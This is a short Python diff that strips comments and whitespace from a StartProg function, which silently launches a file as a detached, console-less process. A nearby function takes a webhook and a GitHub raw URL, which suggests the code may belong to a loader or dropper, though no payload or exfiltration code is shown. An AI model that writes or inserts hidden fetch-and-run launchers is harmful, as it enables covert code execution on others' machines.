@@ -22,11 +22,11 @@ def CreateFandDownloadIT(Webhooook, githubraw):
 def StartProg(FilePath):
     try:
 
-        if os.name == 'nt':  # Windows
-
+        if os.name == 'nt':
+            
             DETACHED_PROCESS = 0x00000008
             CREATE_NEW_PROCESS_GROUP = 0x00000200
-
+            
             flags = DETACHED_PROCESS | CREATE_NEW_PROCESS_GROUP
             
             subprocess.Popen(
@@ -38,7 +38,7 @@ def StartProg(FilePath):
                 close_fds=True
             )
         else:
-            # Double fork pour Unix
+            
             subprocess.Popen(
                 ["pythonw", FilePath],
                 stdout=subprocess.DEVNULL,
